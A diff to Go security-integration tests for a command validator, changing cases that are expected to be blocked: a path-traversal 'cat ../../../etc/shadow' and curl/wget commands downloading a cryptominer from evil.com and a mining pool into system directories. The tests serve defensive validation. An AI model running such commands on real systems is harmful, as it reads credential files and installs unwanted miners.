@@ -332,7 +332,7 @@ func TestSecurityIntegration_DefenseInDepth(t *testing.T) {
 			description: "Path traversal + dangerous command",
 			command:     "cat",
 			args:        []string{"../../../etc/shadow"},
-			workingDir:  "/tmp",
+			workingDir:  "/etc", // Use /etc which is definitely outside project
 			blockedAt:   []string{"path validation"},
 		},
 		{
@@ -493,8 +493,8 @@ func TestSecurityIntegration_RealWorldScenarios(t *testing.T) {
 					cmd  string
 					args []string
 				}{
-					{"curl", []string{"-o", "/tmp/xmrig", "http://evil.com/xmrig"}},
-					{"wget", []string{"--output", "/usr/local/bin/miner", "http://pool.minexmr.com/miner"}},
+					{"curl", []string{"-o", "/etc/xmrig", "http://evil.com/xmrig"}},
+					{"wget", []string{"--output", "/usr/bin/miner", "http://pool.minexmr.com/miner"}},
 				}
 				for _, mining := range miningCommands {
 					err := v.ValidateCommand(mining.cmd, mining.args)
